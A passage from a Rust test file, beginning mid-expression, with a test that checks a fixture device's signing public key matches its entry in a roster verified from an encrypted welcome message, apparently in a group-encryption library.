    .await
}

#[test]
fn the_fixture_device_holds_its_roster_keys() -> TestResult {
    let fixture = fixture();
    let jwk: PublicJwk = SignKey::from_b64(&fixture.sign_key)?.public_jwk()?;
    let welcome = open_welcome(
        &EncKey::from_b64(&fixture.enc_key)?,
        &fixture.member_id,
        &fixture.welcome,
    )?;
    let roster = verify_roster(&fixture.roster, &welcome)?;
    assert_eq!(roster.members[&fixture.member_id].sign_pub, jwk);
    Ok(())
}
